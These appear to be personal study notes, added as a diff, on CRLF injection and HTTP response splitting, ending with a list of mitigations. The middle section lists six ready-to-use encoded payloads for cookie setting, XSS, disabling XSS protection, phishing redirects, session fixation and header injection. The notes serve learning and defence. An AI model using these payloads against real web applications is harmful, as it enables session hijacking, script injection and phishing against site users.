@@ -1,0 +1,29 @@
+https://www.youtube.com/watch?v=WLumsrjwfis
+
+
+CRLF / HTTP Response Splitting /Improper Neutralization of CRLF Sequences./%0d%0a
+refers to special characters Carriage Return (\r)(%0d) Line Feed (\n)(%0a).
+added in url to signify end of line(EOL)
+By introducing this unexpected CRLF injection, the attacker is able to maliciously exploit CRLF  to manipulate the web apps functions
+
+log splitting:
+attacker inserts EOL character to falsify log file entries
+
+
+
+HTTTP response splitting
+adds http header to the http response and perform xss
+1) set cookie via crlf : GET /%0d%0aSet-Cookie:CRLF=MyCookieSetByCRLF HTTP/1.1
+2) xss via crlf : /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+3) disable xss protection via crlf : /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
+4) phishing redirect via crlf : GET /%0d%0aLocation:%20https://bing.com HTTP/1.1
+5) session fixation via crlf : /%0d%0aSet-Cookie:session_id=942....
+6) http header injection via crlf : /%0d%0aTestersHeader:NewHeader
+
+mitigation
+***Sanitization of user input.
+***Encode CR & LF characters (\r, \n) so that even when they’re supplied, they aren’t recognized by the server.
+***Validate the user input before they reach the response headers (e.g. by using methods like StringEscapeUtils.escapeJava()).
+***An unnecessary header should be disabled.
+
+https://www.geeksforgeeks.org/crlf-injection-attack/
